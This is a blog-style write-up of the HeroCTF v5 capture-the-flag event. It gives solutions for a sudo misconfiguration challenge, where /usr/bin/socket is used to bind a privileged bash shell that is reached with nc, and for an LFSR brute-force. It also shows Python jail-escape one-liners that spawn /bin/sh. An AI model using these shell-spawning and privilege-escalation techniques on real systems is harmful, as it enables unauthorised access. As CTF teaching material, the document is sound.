---
title: "HeroCTF v5"
date: 2023-05-14T08:17:41-04:00
categories: [ctf, writeup, blockchain]
tags: [web3, blockchain, PRNG, programming]
cover:
    image: 'HeroCTF_icon_500.png'
---
Organized by the students of Engineering students in France, this was a nice CTF with an interesting variety of challenges. Unfortunately, I did not have much free time to play in the CTF this weekend. I was able to solve a few challenges, and came very close on a couple.

<!--more-->
## Solves

#### Heap
`We caught a hacker red-handed while he was encrypting data. Unfortunately we were too late to see what he was trying to hide. We did however manage to get a dump of the java heap. Try to find the information he wants to hide from us.`


#### SUDOkLu
`This is a warmup to get you going. Your task is to read /home/privilegeduser/flag.txt. For our new commers, the title might steer you in the right direction ;). Good luck!`

```bash
    % ssh user@dyn-02.heroctf.fr -p 11873
    user@sudoklu:~$ id
    uid=1000(user) gid=1000(user) groups=1000(user)
    user@sudoklu:~$ ls -lsart /home/
    total 20
    8 drwxr-xr-x 1 root           root           4096 May 12 10:35 .
    4 drwxr-x--- 1 privilegeduser privilegeduser 4096 May 12 10:35 privilegeduser
    4 drwxr-xr-x 1 root           root           4096 May 15 20:47 ..
    4 drwxr-x--- 1 user           user           4096 May 15 20:48 user

    user@sudoklu:~$ sudo -l
    Matching Defaults entries for user on sudoklu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

    User user may run the following commands on sudoklu:
        (privilegeduser) NOPASSWD: /usr/bin/socket

    user@sudoklu:~$ /usr/bin/socket -h
    /usr/bin/socket: invalid option -- 'h'
    Usage: socket [-bclqrvw] [-B local ip] [-p prog] {{-s|host} port | [-s] /path}


    user@sudoklu:~$ sudo -u privilegeduser /usr/bin/socket -p bash  5555 -s &
    [1] 48


    user@sudoklu:~$ nc localhost 5555
    id
    uid=1001(privilegeduser) gid=1001(privilegeduser) groups=1001(privilegeduser)
    cat /home/privilegeduser/flag.txt
    Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

## After the CTF

#### Futile
`Linear Futile Shift Register`

```python
    from pwn import *
    #p = remote('static-01.heroctf.fr',9001)
    p = process(["python3","orig_chall.py"])
    flag = p.recvline()
    flag_len = len(flag[5:-2])//2  #ignore 'Hero{' and '}\n'
    print(f"Len = {flag_len}")
    count = 1
    flag_vals = []
    for i in range(flag_len):
        flag_vals.append(list([x for x in range(255)]))

    while True:
        for i in range(flag_len):
            val = int(flag[5+2*i:5+2*i+2],16)
            try:
                flag_vals[i].remove(val)
            except Exception as e:
                pass

        print(*[len(x) if len(x) > 1 else chr(x[0]) for x in flag_vals ])
        if (all([len(x)==1 for x in flag_vals])):
            break
        
        p.sendline("\n")
        flag = p.recvline()
        count+=1
    real_flag = [chr(l[0]) for l in flag_vals]
    print("Hero{"+''.join(real_flag)+"}")
    print(f"#iterations: [{count}]  Flag length: [{flag_len}]")
```

#### Uniform
`A Mersenne Twister with a twist`


#### pyGulag solutions
```python
    >>> print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])
    >>> print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))
```
## Writeups
* Official writeups: https://github.com/HeroCTF/HeroCTF_v5/
* Blockchain writeups: https://github.com/J4X-98/Writeups/tree/main/CTFs/HeroCTF
* https://siunam321.github.io/ctf/HeroCTF-v5/
* https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/
* https://chrootcommit.github.io/tags/heroctfv5/




## Challenges
|Category|Challenge|Description
|----|----|----
|Blockchain|Challenge 01 : Classic one tbh|
|Blockchain|Challenge 02 : Dive into real life stuff|
|Blockchain|Challenge 03 : You have to be kidding me..|
|Blockchain|Challenge 04 : Now this is real life|
|Blockchain|The Second Transaction and the Offshore Connection|
|Blockchain|The Third Transaction and the Insider|
|Blockchain|The arrest|
|Blockchain|Tracing the First Transaction|
|Crypto|Futile|LFSR+brute_force+
|Crypto|Hyper Loop|
|Crypto|Lossy|
|Crypto|Uniform|Symbolic Mersenne Twister, PRNG with float
|Forensic|Heap|Java Heap analysis + AES
|Forensic|My Poor Webserver|
|Forensic|Windows Stands for Loser|
|Forensic|dev.corp 1/4|
|Forensic|dev.corp 2/4|
|Forensic|dev.corp 3/4|
|Forensic|dev.corp 4/4|
|Misc|Erlify|
|Misc|Feedback|
|Misc|I_Use_zsh_BTW|
|Misc|Irreductible|
|Misc|Pygulag|
|Misc|Pyjail|
|Misc|Welcome|
|OSINT|Hero Agency 1/4|
|OSINT|Hero Agency 2/4|
|OSINT|Hero Agency 3/4|
|OSINT|Hero Agency 4/4|
|OSINT|OpenPirate|
|Prog|Math Trap|
|Prog|cub|2-d puzzle construction (small)
|Prog|e-pu|3-d puzzle construction (med)
|Prog|zzle|3-d puzzle construction (v.large)
|Pwn|Appointment Book|
|Pwn|Gladiator|
|Pwn|Impossible v2|
|Pwn|Rope Dancer|
|Pwn|Unknown|
|Reverse|Give My Money Back|
|Reverse|Hero Ransom|
|Reverse|InfeXion 1/4|
|Reverse|InfeXion 2/4|
|Reverse|InfeXion 3/4|
|Reverse|InfeXion 4/4|
|Reverse|Optimus Prime|
|Reverse|Scarface|
|Reverse|Wourtyx RPG|
|Reverse|sELF control v3|
|Sponsors|Open your eyes 1/5|
|Sponsors|Open your eyes 2/5|
|Sponsors|Open your eyes 3/5|
|Sponsors|Open your eyes 4/5|
|Sponsors|Open your eyes 5/5|
|Steganography|Annoucement|
|Steganography|EMD|
|Steganography|LSD#2|
|Steganography|PDF-Mess|
|Steganography|PNG-G|
|Steganography|Subliminal#2|
|System|Chm0d| Unix chmod 000 situation
|System|Drink from my Flask#2|
|System|IMF#0: Your mission, should you choose to accept it|
|System|IMF#1: Bug Hunting|
|System|IMF#2: A woman's weapon|
|System|IMF#3: admin:admin|
|System|IMF#4: Put the past behind|
|System|SUDOkLu| Sudo misconfiguration
|Web|Best Schools|
|Web|Blogodogo 1/2|
|Web|Blogodogo 2/2|
|Web|Drink from my Flask#1|
|Web|Referrrrer|
|Web|Simple Notes|
|Web|YouWatch|